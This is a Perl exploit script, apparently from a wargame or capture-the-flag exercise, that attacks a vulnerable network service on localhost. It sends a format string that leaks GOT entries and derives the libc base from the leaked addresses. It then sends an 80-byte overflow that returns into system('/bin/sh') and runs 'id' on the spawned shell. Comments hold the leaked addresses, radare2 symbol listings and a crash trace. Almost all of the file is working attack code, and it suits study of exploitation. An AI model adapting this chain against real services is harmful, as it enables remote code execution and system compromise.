use strict;
use warnings;
use IO::Socket::INET;

#####
my $ip = "127.0.0.1";
my $port = 1337;
my $protocol = "tcp";
my $got_table = "\x0c\xa0\x04\x08";
#####

my $socket = new IO::Socket::INET(
    PeerHost => $ip,
    PeerPort => $port,
    Proto => $protocol,
);
die "[-] Could not connect: $!\n" unless $socket;
print "[+] Connected to $ip:$port\n";

# Receive line of text
$socket->recv(my $response, 5000);
print "[+] Response: $response\n";

my $fmt = "${got_table}%8\$s\n";
print "[+] Sending format string ...\n";
$socket->send($fmt, 5000);

# Receive line of text
$socket->recv($response, 5000);
print "[+] Response: $response\n";

# Parse response
$response =~ /Unsafe printing: (.+)\nNow that/s;
my $got_bytes = $1;
my @addresses = unpack("V*", $got_bytes);
foreach(@addresses) {
	printf("[+] Address leaked: 0x%08x\n", $_);
}
#[+] Address leaked: 0x0804a00c <-- Just our 4 uninterpreted bytes from our format string :)
#[+] Address leaked: 0xb75d9280 <-- printf
#[+] Address leaked: 0xb75ef810 <-- fflush
#[+] Address leaked: 0x080483d6 <-- gets
#[+] Address leaked: 0xb75efb20 <-- fgets
#[+] Address leaked: 0xb75f1650 <-- puts
#[+] Address leaked: 0x08048406 <-- __gmon_start__
#[+] Address leaked: 0xb75a5990 <-- ?

my %leaked_addresses = (
	'printf' => $addresses[1],
	'fflush' => $addresses[2],
	'gets' => $addresses[3],
	'fgets' => $addresses[4],
	'puts' => $addresses[5]
);

my %symbol_base_addr = (
	'gets' => 0x00064cd0,
	'fgets' => 0x00063b20,
	'fflush' => 0x00063810,
	'puts' => 0x00065650,
	'printf' => 0x0004d280,
	'system' => 0x00040190,
	'/bin/sh' => 0x00160a24
);

foreach(keys(%leaked_addresses)) {
	print "[-] According to $_ the base address is: " . ($leaked_addresses{$_} - $symbol_base_addr{$_}) . "\n";
}

my $leaked_libc_base_addr = $leaked_addresses{fflush} - $symbol_base_addr{fflush};
print "[-] Leaked base address: $leaked_libc_base_addr\n";
my $system_addr = $leaked_libc_base_addr + $symbol_base_addr{system};
my $binsh_addr = $leaked_libc_base_addr + $symbol_base_addr{'/bin/sh'};
printf("[-] System() = 0x%08x, /bin/sh = 0x%08x\n", $system_addr, $binsh_addr);

# [0x00019be0]> afl~gets
# 0x0002cff0   10 204  -> 198  sym.catgets
# 0x000408e0   14 284  -> 278  sym.getsubopt
# 0x00063b20   25 374  -> 320  sym.fgets
# 0x00064cd0   25 390  -> 336  sym.gets
# 0x00069660   11 163  -> 157  sym.fgets_unlocked
# <snip>
# [0x00019be0]> afl~fflush
# 0x00063810   18 56720 -> 207  sym.fflush
# 0x00069400    3 56   -> 82   sym.fflush_unlocked
# [0x00019be0]> afl~puts
# 0x000640a0   26 349  -> 289  sym.fputs
# 0x00065650   29 446  -> 390  sym._IO_puts
# 0x00069710    8 151  -> 140  sym.fputs_unlocked
# 0x000f1050   73 1056 -> 1036 sym.putspent
# 0x000f2860   33 521  -> 514  sym.putsgent
# [0x00019be0]> afl~printf
# <snip>
# 0x0004c940   16 216  -> 225  sym.register_printf_type
# 0x0004ca20  119 2048 -> 1983 sym.printf_size
# 0x0004d220    3 42           sym.printf_size_info
# 0x0004d250    1 35           sym._IO_fprintf
# 0x0004d280    1 52           sym._IO_printf
# 0x0004d2c0    1 56           sym.snprintf
# 0x0004d300    1 35           sym.sprintf
# <snip>
# [0x00019be0]> iz~/bin/sh
# vaddr=0x00160a24 paddr=0x00160a24 ordinal=633 sz=8 len=7 section=.rodata type=ascii string=/bin/sh

# my $buf = "AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFABGABHABIABJABKABLABMABNABOABPABQABRABSABTABUABVABWABXABYABZABaABbABcABdABeABfABgABhABiABjABkABlABmAB\n";
# results in: 
# --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x41416241} ---
# +++ killed by SIGSEGV (core dumped) +++
# Segmentation fault (core dumped)
# koffiedrinker@warzone:/data/exploitation/format_strings$ r2 -
#  -- r2 -- leading options since 2006
# [0x00000000]> wopO 0x41416241
# 80

my $buf = "A" x 80 . pack("V", $system_addr) . "BBBB" . pack("V", $binsh_addr) . "\n";

print "[+] Sending buffer ...\n";
$socket->send($buf, 5000);

# Receive line of text
$socket->recv($response, 5000);
print "[+] Response: $response\n";

$buf = "id\n";
$socket->send($buf, 5000);

# Receive line of text
$socket->recv($response, 5000);
print "[+] Response: $response\n";

$socket->close();
